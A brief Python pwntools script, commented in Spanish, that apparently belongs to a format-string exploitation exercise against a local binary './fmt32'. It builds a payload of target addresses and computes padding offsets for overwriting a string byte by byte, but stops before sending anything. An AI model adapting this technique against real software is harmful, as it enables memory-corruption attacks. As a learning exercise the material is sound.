#!/usr/bin/python

from pwn import *


PATH = './fmt32'

CADENA_ADDR = 0xffffcf58


# Construimos el payload

payload  = p32(CADENA_ADDR)  		# Direccion para leer
payload += p32(CADENA_ADDR+2)		# Direccion del primer byte para escribir
payload += p32(CADENA_ADDR+3)		# Direccion del segundo byte para escribir
payload += p32(CADENA_ADDR+4)		# Direccion del tercer byte para escribir
payload += p32(CADENA_ADDR+5)		# Direccion del cuarto byte para escribir
payload += "|"


cadena_nueva = 'onta'

valor_inicial = len(payload)
for caracter in cadena_nueva: 
	valor = ord(caracter)
	offset = (valor-valor_inicial)%256
	print ("Caracter: %c, valor: %d, Offset: %d\n" % (caracter, valor, offset))
	valor_inicial = valor










